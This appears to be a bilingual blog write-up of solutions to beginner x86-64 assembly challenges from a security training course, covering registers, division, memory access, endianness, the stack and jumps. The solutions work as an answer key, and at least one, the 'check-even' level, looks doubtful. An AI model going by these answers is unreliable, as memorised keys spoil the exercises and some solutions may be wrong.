<h4 id="3-Writing-Strings"><a href="#3-Writing-Strings" class="headerlink" title="3. Writing Strings"></a>3. Writing Strings</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">14</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="4-Reading-Data"><a href="#4-Reading-Data" class="headerlink" title="4. Reading Data"></a>4. Reading Data</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">8</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">8</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h3 id="Assembly-Crash-Course"><a href="#Assembly-Crash-Course" class="headerlink" title="Assembly Crash Course"></a>Assembly Crash Course</h3><h4 id="1-set-register"><a href="#1-set-register" class="headerlink" title="1. set-register"></a>1. set-register</h4><p>要求：<code>rdi = 0x1337</code></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0x1337</span><br></code></pre></td></tr></table></figure>



<h4 id="2-set-multiple-registers"><a href="#2-set-multiple-registers" class="headerlink" title="2. set-multiple-registers"></a>2. set-multiple-registers</h4><p>In this level, you will work with multiple registers. Please set the following:</p>
<ul>
<li><code>rax = 0x1337</code></li>
<li><code>r12 = 0xCAFED00D1337BEEF</code></li>
<li><code>rsp = 0x31337</code></li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x1337</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r12</span>, <span class="hljs-number">0xCAFED00D1337BEEF</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0x31337</span><br></code></pre></td></tr></table></figure>



<h4 id="3-add-to-register"><a href="#3-add-to-register" class="headerlink" title="3. add-to-register"></a>3. add-to-register</h4><p>Do the following:</p>
<ul>
<li>Add <code>0x331337</code> to <code>rdi</code></li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0x331337</span><br></code></pre></td></tr></table></figure>



<h4 id="4-linear-equation-registers"><a href="#4-linear-equation-registers" class="headerlink" title="4. linear-equation-registers"></a>4. linear-equation-registers</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">imul</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br><br></code></pre></td></tr></table></figure>



<h4 id="5-integer-division"><a href="#5-integer-division" class="headerlink" title="5. integer-division"></a>5. integer-division</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">div</span> <span class="hljs-built_in">rsi</span><br></code></pre></td></tr></table></figure>



<h4 id="6-modulo-operation"><a href="#6-modulo-operation" class="headerlink" title="6. modulo-operation"></a>6. modulo-operation</h4><p>div操作之后，余数会被存于rdx(dx)中。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">div</span> <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br></code></pre></td></tr></table></figure>



<h4 id="7-set-upper-byte"><a href="#7-set-upper-byte" class="headerlink" title="7. set-upper-byte"></a>7. set-upper-byte</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">MSB                                    LSB</span><br><span class="hljs-section">+----------------------------------------+</span><br><span class="hljs-section">|                   rax                  |</span><br><span class="hljs-section">+--------------------+-------------------+</span><br><span class="hljs-code">                     |        eax        |</span><br><span class="hljs-code">                     +---------+---------+</span><br><span class="hljs-code">                               |   ax    |</span><br><span class="hljs-code">                               +----+----+</span><br><span class="hljs-code">                               | ah | al |</span><br><span class="hljs-code">                               +----+----+</span><br></code></pre></td></tr></table></figure>

<p>Using only one move instruction, please set the upper 8 bits of the <code>ax</code> register to <code>0x42</code>.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">ah</span>, <span class="hljs-number">0x42</span><br></code></pre></td></tr></table></figure>



<h4 id="8-efficient-modulo"><a href="#8-efficient-modulo" class="headerlink" title="8. efficient-modulo"></a>8. efficient-modulo</h4><p>Using only the following instruction(s):</p>
<ul>
<li><code>mov</code></li>
</ul>
<p>Please compute the following:</p>
<ul>
<li><code>rax = rdi % 256</code></li>
<li><code>rbx = rsi % 65536</code></li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">cl</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>, <span class="hljs-built_in">dx</span><br></code></pre></td></tr></table></figure>



<h4 id="9-byte-extraction"><a href="#9-byte-extraction" class="headerlink" title="9. byte-extraction"></a>9. byte-extraction</h4><p><code>shl</code>指令：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-comment">;rax = 10001010</span><br><span class="hljs-keyword">shl</span> al<span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><br><span class="hljs-comment">;al = 00010100</span><br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">shr</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">32</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">bl</span><br></code></pre></td></tr></table></figure>



<h4 id="10-bitwise-and"><a href="#10-bitwise-and" class="headerlink" title="10. bitwise-and"></a>10. bitwise-and</h4><p>如果不使用以下说明：<code>mov</code>、<code>xchg</code>，请执行以下操作：<br>将 <code>rax</code> 设置为 <code>（rdi AND rsi）</code> 的值</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">and</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">and</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br></code></pre></td></tr></table></figure>





<h4 id="11-check-even"><a href="#11-check-even" class="headerlink" title="11. check-even"></a>11. check-even</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">and</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">and</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br></code></pre></td></tr></table></figure>



<h4 id="12-memory-read"><a href="#12-memory-read" class="headerlink" title="12. memory-read"></a>12. memory-read</h4><p>请执行以下操作：将存储在 <code>0x404000</code> 的值放入 <code>rax</code> 中。确保 <code>rax</code> 中的值是存储在 <code>0x404000</code> 的原始值。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-number">0x404000</span>]<br><br></code></pre></td></tr></table></figure>



<h4 id="13-memory-write"><a href="#13-memory-write" class="headerlink" title="13. memory-write"></a>13. memory-write</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-number">0x404000</span>], <span class="hljs-built_in">rax</span><br><br></code></pre></td></tr></table></figure>



<h4 id="14-memory-increment"><a href="#14-memory-increment" class="headerlink" title="14. memory-increment"></a>14. memory-increment</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-number">0x404000</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span> , <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rbx</span> , <span class="hljs-number">0x1337</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-number">0x404000</span>], <span class="hljs-built_in">rbx</span><br></code></pre></td></tr></table></figure>



<h4 id="15-byte-access"><a href="#15-byte-access" class="headerlink" title="15. byte-access"></a>15. byte-access</h4><p>Here is the breakdown of the names of memory sizes:<br>以下是内存大小名称的细分：</p>
<ul>
<li>Quad Word &#x3D; 8 Bytes &#x3D; 64 bits<br>四字 &#x3D; 8 字节 &#x3D; 64 位</li>
<li>Double Word &#x3D; 4 bytes &#x3D; 32 bits<br>双字 &#x3D; 4 字节 &#x3D; 32 位</li>
<li>Word &#x3D; 2 bytes &#x3D; 16 bits<br>字 &#x3D; 2 字节 &#x3D; 16 位</li>
<li>Byte &#x3D; 1 byte &#x3D; 8 bits<br>字节 &#x3D; 1 字节 &#x3D; 8 位</li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [<span class="hljs-number">0x404000</span>]<br></code></pre></td></tr></table></figure>

<p>在 x86_64 中，您可以在取消引用地址时访问这些大小，就像使用更大或更小的 register 访问一样：</p>
<ul>
<li><code>mov al, [address]</code> &lt;&#x3D;&gt; moves the least significant byte from address to <code>rax</code><br><code>mov al， [address]</code> &lt;&#x3D;&gt; 将最低有效字节从 address 移动到 <code>rax</code></li>
<li><code>mov ax, [address]</code> &lt;&#x3D;&gt; moves the least significant word from address to <code>rax</code><br><code>mov ax， [address]</code> &lt;&#x3D;&gt; 将最低有效字从 address 移动到 <code>rax</code></li>
<li><code>mov eax, [address]</code> &lt;&#x3D;&gt; moves the least significant double word from address to <code>rax</code><br><code>mov eax， [address]</code> &lt;&#x3D;&gt; 将最低有效双字从 address 移动到 <code>rax</code></li>
<li><code>mov rax, [address]</code> &lt;&#x3D;&gt; moves the full quad word from address to <code>rax</code><br><code>mov rax， [address]</code> &lt;&#x3D;&gt; 将完整的四元字从 address 移动到 <code>rax</code></li>
</ul>
<h4 id="16-memory-size-access"><a href="#16-memory-size-access" class="headerlink" title="16. memory-size-access"></a>16. memory-size-access</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [<span class="hljs-number">0x404000</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>, [<span class="hljs-number">0x404000</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, [<span class="hljs-number">0x404000</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-number">0x404000</span>]<br></code></pre></td></tr></table></figure>



<h4 id="17-little-endian-write"><a href="#17-little-endian-write" class="headerlink" title="17. little-endian-write"></a>17. little-endian-write</h4><p>值得注意的是，值的存储顺序与我们表示它们的顺序相反。example:</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-comment">;[0x1330] = 0x00000000deadc0de</span><br><span class="hljs-comment">; 检查它在内存中的实际存储情况：</span><br><span class="hljs-comment">;[0x1330] = 0xde</span><br><span class="hljs-comment">;[0x1331] = 0xc0</span><br><span class="hljs-comment">;[0x1332] = 0xad</span><br><span class="hljs-comment">;[0x1333] = 0xde</span><br><span class="hljs-comment">;[0x1334] = 0x00</span><br><span class="hljs-comment">;[0x1335] = 0x00</span><br><span class="hljs-comment">;[0x1336] = 0x00</span><br><span class="hljs-comment">;[0x1337] = 0x00</span><br></code></pre></td></tr></table></figure>

<p>这就是小端存储（Little Endian）。</p>
<p>exp</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0xdeadbeef00001337</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0xc0ffee0000</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsi</span>], <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure>



<h4 id="18-memory-sum"><a href="#18-memory-sum" class="headerlink" title="18. memory-sum"></a>18. memory-sum</h4><p>内存是连续存储的，因此可以使用偏移量来获取指定字节。例如：</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs prolog">;[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0x00000000deadbeef</span><br>;[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0xef</span><br>;[<span class="hljs-number">0x1337</span> + <span class="hljs-number">1</span>] = <span class="hljs-number">0xbe</span><br>;[<span class="hljs-number">0x1337</span> + <span class="hljs-number">2</span>] = <span class="hljs-number">0xad</span><br>...<br>;[<span class="hljs-number">0x1337</span> + <span class="hljs-number">7</span>] = <span class="hljs-number">0x00</span><br>; 假设我需要访问某个地址的第<span class="hljs-number">5</span>个字节。那么可以：<br>mov al, [address+<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure>

<p>题目要求：</p>
<ul>
<li>Load two consecutive quad words from the address stored in <code>rdi</code>.<br>从存储在 <code>rdi</code> 中的地址加载两个连续的四字。</li>
<li>Calculate the sum of the previous steps’ quad words.<br>计算前面步骤的四边形词的总和。</li>
<li>Store the sum at the address in <code>rsi</code>.<br>将总和存储在 <code>rsi</code> 中的地址。</li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsi</span>], <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure>



<h4 id="19-stack-substraction"><a href="#19-stack-substraction" class="headerlink" title="19. stack-substraction"></a>19. stack-substraction</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure>



<h4 id="20-swap-stack-values"><a href="#20-swap-stack-values" class="headerlink" title="20. swap-stack-values"></a>20. swap-stack-values</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br></code></pre></td></tr></table></figure>



<h4 id="21-average-stack-values"><a href="#21-average-stack-values" class="headerlink" title="21. average-stack-values"></a>21. average-stack-values</h4><p>除法还是很坑的，记得一定是<code>rdx:rax / reg</code>，商在rax中，余数在rdx中。因此，在调用div的时候一定要清空rdx寄存器（如果被除数没有占用到rdx的话）</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rsp</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x18</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">div</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure>



<h4 id="22-absolute-jump"><a href="#22-absolute-jump" class="headerlink" title="22. absolute-jump"></a>22. absolute-jump</h4><p>绝对跳转，指的是跳转到指定地址</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x403000</span><br>    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure>



<h4 id="23-relative-jump"><a href="#23-relative-jump" class="headerlink" title="23. relative-jump"></a>23. relative-jump</h4><p>对于所有跳转，有三种类型：</p>
<ul>
<li>Relative jumps: jump + or - the next instruction.<br>相对跳转：jump + 或 - 下一条指令。</li>
<li>Absolute jumps: jump to a specific address.<br>Absolute jumps：跳转到指定地址。</li>
<li>Indirect jumps: jump to the memory address specified in a register.<br>Indirect jumps：跳转到 register 中指定的 memory 地址。</li>
</ul>
<p><code>jmp (reg1 | addr | +/-offset)</code></p>
<p>要求：</p>
<ul>
<li>Make the first instruction in your code a <code>jmp</code>.<br>将代码中的第一条指令设为 <code>jmp</code>。</li>
<li>Make that <code>jmp</code> a relative jump to 0x51 bytes from the current position.<br>使该 <code>jmp</code> 相对跳转到 0x51 字节的当前位置。</li>
<li>At the code location where the relative jump will redirect control flow, set <code>rax</code> to 0x1.<br>在相对跳转将重定向控制流的代码位置，将 <code>rax</code> 设置为 0x1。</li>
</ul>
